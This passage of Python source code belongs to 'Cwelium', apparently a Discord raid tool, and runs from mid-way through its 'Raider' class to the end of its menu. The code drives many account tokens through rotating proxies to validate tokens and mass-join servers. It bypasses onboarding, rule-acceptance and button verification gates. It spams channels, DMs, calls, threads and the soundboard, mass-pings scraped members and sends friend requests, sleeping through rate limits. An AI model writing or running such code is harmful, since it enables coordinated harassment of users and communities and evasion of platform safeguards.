                        time.sleep(9)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def friender(self, token, nickname):
        try:
            payload = {
                "username": nickname,
                "discriminator": None,
            }

            response = session.post(
                f"https://discord.com/api/v9/users/@me/relationships", 
                headers=self.headers(token), 
                json=payload
            )

            match response.status_code:
                case 204:
                    console.log(f"Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case 400:
                    console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json())
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def guild_checker(self, guild_id):
        def main_checker(token):
            try:
                while True:
                    response = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token)
                    )

                    match response.status_code:
                        case 200:
                            console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                            break
                        case 429:
                            retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                            console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                            time.sleep(float(retry_after))
                        case _:
                            console.log("Not Found", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                            break
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main_checker, args)

    def token_checker(self):
        valid = []

        def main(token):
            try:
                while True:
                    response = session.get(
                        "https://discordapp.com/api/v9/users/@me/library",
                        headers=self.headers(token)
                    )

                    match response.status_code:
                        case 200:
                            console.log("Valid", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                            valid.append(token)
                            break
                        case 403:
                            console.log("Locked", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                            break
                        case 429:
                            retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                            console.log("Ratelimit", C["pink"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"{retry_after}s")
                            time.sleep(retry_after)
                        case _:
                            console.log("Invalid", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                            break
                with open("data/tokens.txt", "w") as f:
                    f.write("\n".join(valid))
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        with open("data/tokens.txt", "r") as f:
            tokens = list({line.strip().replace('"', '') for line in f if line.strip()})
        
        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main, args)

    def accept_rules(self, guild_id):
        try:
            valid = []
                
            for token in tokens:
                value = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/member-verification",
                    headers=self.headers(token)
                )

                match value.status_code:
                    case 200:
                        valid.append(token)
                        payload = value.json()
                        break

            if not valid:
                console.log("Failed", C["red"], "All tokens are Invalid")
                input()
                Menu().main_menu()

            def run_main(token):
                try:
                    response = session.put(
                        f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me",
                        headers=self.headers(token),
                        json=payload
                    )

                    match response.status_code:
                        case 201:
                            console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token, ) for token in tokens
            ]
            Menu().run(run_main, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Accept Rules", e)

    def onboard_bypass(self, guild_id):
        try:
            onboarding_responses_seen = {}
            onboarding_prompts_seen = {}
            onboarding_responses = []
            in_guild = []

            for _token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
                    headers=self.headers(_token)
                )

                match response.status_code:
                    case 200:
                        in_guild.append(_token)
                        break

            if not in_guild:
                console.log("Failed", C["red"], "Missing Access")
                input()
                Menu().main_menu()
            else:
                data = response.json()
                now = int(datetime.now().timestamp())

                for __ in data["prompts"]:
                    onboarding_responses.append(__["options"][-1]["id"])

                    onboarding_prompts_seen[__["id"]] = now

                    for prompt in __["options"]:
                        if prompt:
                            onboarding_responses_seen[prompt["id"]] = now
                        else:
                            console.log("Failed", C["red"], "No onboarding in This Server",)
                            input()
                            Menu().main_menu()

            def run_task(token):
                try:
                    json_data = {
                        "onboarding_responses": onboarding_responses,
                        "onboarding_prompts_seen": onboarding_prompts_seen,
                        "onboarding_responses_seen": onboarding_responses_seen,
                    }

                    response = session.post(
                        f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                        headers=self.headers(token),
                        json=json_data
                    )

                    match response.status_code:
                        case 200:
                            console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token, ) for token in tokens
            ]
            Menu().run(run_task, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Pass Onboard", e)
            input()
            Menu().main_menu()

    def reactor_main(self, channel_id, message_id):
        try:
            access_token = []
            emojis = []

            params = {
                "around": message_id, 
                "limit": 50
            }

            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )

                match response.status_code:
                    case 200:
                        access_token.append(token)
                        break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
            else:
                data = response.json()
                for __ in data:
                    if __["id"] == message_id:
                        reactions = __["reactions"]
                        for emois in reactions:
                            if emois:
                                emoji_id = emois["emoji"]["id"]
                                emoji_name = emois["emoji"]["name"]

                                if emoji_id is None:
                                    emojis.append(emoji_name)
                                else:
                                    emojis.append(f"{emoji_name}:{emoji_id}")
                            else:
                                console.log("Failed", C["red"], "No reactions Found in this message",)
                                input()
                                Menu().main_menu()

                for i, emoji in enumerate(emojis, start=1):
                    print(f"{C[color]}0{i}:{C['white']} {emoji}")

                choice = input(f"\n{console.prompt('Choice')}")
                if choice.startswith('0') and len(choice) == 2:
                    choice = str(int(choice))
                selected = emojis[int(choice) - 1]

            def add_reaction(token):
                try:
                    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{selected}/@me"

                    if emoji_id is None:
                        url += "?location=Message&type=0"
                    response = session.put(url, headers=self.headers(token))

                    match response.status_code:
                        case 204:
                            console.log("Reacted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", selected)
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(add_reaction, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get emojis", e)
            input()
            Menu().main_menu()

    def button_bypass(self, channel_id, message_id, guild_id):
        try:
            access_token = []
            buttons = []

            params = {"around": message_id, "limit": 50}

            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )

                match response.status_code:
                    case 200:
                        access_token.append(token)
                        break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
            else:
                message = next((m for m in response.json() if m["id"] == message_id), None)

                if not message:
                    console.log("Failed", C["red"], "Message not found")
                    input()
                    Menu().main_menu()
                else:
                    for row in message.get("components", []):
                        for comp in row.get("components", []):
                            if comp.get("type") == 2:
                                label = comp.get("label", "No Label")
                                custom_id = comp["custom_id"]
                                buttons.append({
                                    "label": label,
                                    "custom_id": custom_id,
                                })

                    if not buttons:
                        console.log("Failed", C["red"], "No buttons found in this message")
                        input()
                        Menu().main_menu()

            for i, btn in enumerate(buttons, start=1):
                print(f"{C[color]}0{i}:{C['white']} {btn['label']}")

            choice = input(f"\n{console.prompt('Choice')}")
            if choice.startswith('0') and len(choice) == 2:
                choice = str(int(choice))

            btn = buttons[int(choice) - 1]
            custom_id = btn["custom_id"]

            def click_button(token):
                try:
                    payload = {
                        "application_id": message["author"]["id"],
                        "channel_id": channel_id,
                        "data": {
                            "component_type": 2,
                            "custom_id": custom_id,
                        },
                        "guild_id": guild_id,
                        "message_flags": 0,
                        "message_id": message_id,
                        "nonce": self.nonce(),
                        "session_id": uuid.uuid4().hex,
                        "type": 3,
                    }

                    resp = session.post(
                        "https://discord.com/api/v9/interactions",
                        headers=self.headers(token),
                        json=payload
                    )

                    match resp.status_code:
                        case 204:
                            console.log("Clicked", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", btn["label"])
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(click_button, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get buttons", e)
            input()
            Menu().main_menu()

class Menu:
    def __init__(self):
        if not color:
            self.background = C["light_blue"]
        else:
            self.background = C[color]
            
        self.raider = Raider()
        self.options = {
            "1": self.joiner, 
            "2": self.leaver,
            "3": self.spammer, 
            "4": self.checker,
            "5": self.reactor, 
            "7": self.formatter,
            "8": self.button,
            "9": self.accept,
            "10": self.guild,
            "11": self.friender,
            "13": self.onliner,
            "14": self.soundbord,
            "15": self.nick_changer,
            "16": self.Thread_Spammer,
            "17": self.typier,
            "19": self.caller,
            "20": self.bio_changer,
            "21": self.voice_joiner,
            "22": self.onboard,
            "23": self.dm_spam,
            "24": self.exits,
            "~": self.credit,
        }

    def main_menu(self):
        console.run()

        choice = input(f"{' '*6}{self.background}-> {Fore.RESET}")

        if choice.startswith('0') and len(choice) == 2:
            choice = str(int(choice))

        if choice.lower() in self.options:
            console.render_ascii()
            self.options[choice.lower()]()
        else:
            self.main_menu()

    def run(self, func, args):
        threads = []
        console.clear()
        console.render_ascii()

        for idx, arg in enumerate(args):
            if proxy and proxies:
                selected_proxy = proxies[idx % len(proxies)]
                session.proxies = {
                    "http": f"http://{selected_proxy}",
                    "https": f"http://{selected_proxy}"
                }
            else:
                session.proxies = {} 
                
            thread = threading.Thread(target=func, args=arg, daemon=True)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        input(f"\n   {self.background}~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def dm_spam(self):
        console.title(f"Cwelium - Dm Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        message = input(console.prompt("Message"))
        if message == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        args = [
            (token, user_id, message) for token in tokens
        ]
        self.run(self.raider.dm_spammer, args)

    @wrapper
    def soundbord(self):
        console.title(f"Cwelium - Soundboard Spam")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
            
        channel = Link.split("/")[5]
        guild = Link.split("/")[4]

        console.clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.join_voice_channel, args=(token, guild, channel)).start()
            threading.Thread(target=self.raider.soundbord, args=(token, channel)).start()

    @wrapper
    def friender(self):
        console.title(f"Cwelium - Friender")
        nickname = input(console.prompt("Nick"))
        if nickname == "":
            self.main_menu()

        args = [
            (token, nickname) for token in tokens
        ]
        self.run(self.raider.friender, args)

    @wrapper
    def caller(self):
        console.title(f"Cwelium - Call Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        args = [
            (token, user_id) for token in tokens
        ]
        self.run(self.raider.call_spammer, args)

    def onliner(self):
        console.title(f"Cwelium - Onliner")
        args = [
            (token, websocket.WebSocket()) for token in tokens
        ]
        self.run(self.raider.onliner, args)

    @wrapper
    def typier(self):
        console.title(f"Cwelium - Typer")
        Link = input(console.prompt(f"Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        channelid = Link.split("/")[5]
        args = [
            (token, channelid) for token in tokens
        ]
        self.run(self.raider.typier, args)

    @wrapper
    def nick_changer(self):
        console.title(f"Cwelium - Nickname Changer")
        nick = input(console.prompt("Nick"))
        if nick == "" or len(nick) > 32:
            self.main_menu()

        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild, nick) for token in tokens
        ]
        self.run(self.raider.mass_nick, args)

    @wrapper
    def voice_joiner(self):
        console.title(f"Cwelium - Voice Joiner")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        guild = Link.split("/")[4]
        channel = Link.split("/")[5]
        args = [
            (token, guild, channel) for token in tokens
        ]
        self.run(self.raider.join_voice_channel, args)

    @wrapper
    def Thread_Spammer(self):
        console.title(f"Cwelium - Thread Spammer")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        name = input(console.prompt("Name"))
        if name == "":
            self.main_menu()

        channel_id = Link.split("/")[5]
        args = [
            (token, channel_id, name) for token in tokens
        ]
        self.run(self.raider.thread_spammer, args)

    @wrapper
    def joiner(self):
        console.title(f"Cwelium - Joiner")
        invite = input(console.prompt(f"Invite"))
        if invite == "":
            self.main_menu()

        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite)

        self.raider.joiner(invite)

    @wrapper 
    def leaver(self):
        console.title(f"Cwelium - Leaver")
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild) for token in tokens
        ]
        self.run(self.raider.leaver, args)

    @wrapper
    def spammer(self):
        console.title(f"Cwelium - Spammer")
        link = input(console.prompt(f"Channel LINK"))
        if link == "" or not link.startswith("https://"):
            self.main_menu()

        guild_id = link.split("/")[4]
        channel_id = link.split("/")[5]

        massping = input(console.prompt("Massping", True))
        random_str = input(console.prompt("Random String", True))
        message = input(console.prompt("Message"))

        if message == "":
            self.main_menu()

        delay_input = input(console.prompt("Delay (seconds)"))
        delay = None
        if delay_input != "":
            delay = float(delay_input)

        ping_count = None
        if "y" in massping:
            console.log(f"Scraping users", self.background, False, "this may take a while...")
            self.raider.member_scrape(guild_id, channel_id)
            count_str = input(console.prompt("Pings Amount"))
            if count_str == "":
                self.main_menu()

            ping_count = int(count_str)

        args = [
            (token, channel_id, message, guild_id, "y" in massping, ping_count, "y" in random_str, delay)
            for token in tokens
        ]

        self.run(self.raider.spammer, args)

    def checker(self):
        console.title(f"Cwelium - Checker")
        self.raider.token_checker()

    @wrapper
    def reactor(self):
        console.title(f"Cwelium - Reactor")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]
        console.clear()
        console.render_ascii()
        self.raider.reactor_main(channel_id, message_id)

    def button(self):
        console.title(f"Cwelium - Button Click")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
            return

        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]

        console.clear()
        console.render_ascii()
        self.raider.button_bypass(channel_id, message_id, guild_id)

    def formatter(self):
        console.title(f"Cwelium - Formatter")
        self.run(self.raider.format_tokens, [()])

    @wrapper
    def accept(self):
        console.title(f"Cwelium - Accept Rules")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.accept_rules(guild_id)

    @wrapper
    def guild(self):
        console.title(f"Cwelium - Guild Checker")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.guild_checker(guild_id)

    @wrapper
    def bio_changer(self):
        console.title(f"Cwelium - Bio Changer")
        bio = input(console.prompt("Bio"))
        if bio == "":
            self.main_menu()

        args = [
            (token, bio) for token in tokens
        ]
        self.run(self.raider.bio_changer, args)

    @wrapper
    def onboard(self):
        console.title(f"Cwelium - Onboarding Bypass")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.onboard_bypass(guild_id)

    @wrapper
    def credit(self):
        credits_lines = [
            "Special Thanks to",
            "Coder: Tips",
            "Scraper: Aniell4",
            "Original Owner of Helium/Cwelium: Ekkore",
            "And last but not least, you! Without you, this project wouldn't be possible.",
        ]

        for line in credits_lines:
            centered_line = line.center(os.get_terminal_size().columns)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")

        input("\n ~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def exits(self):
        os._exit(0)

if __name__ == "__main__":
    Menu().main_menu()

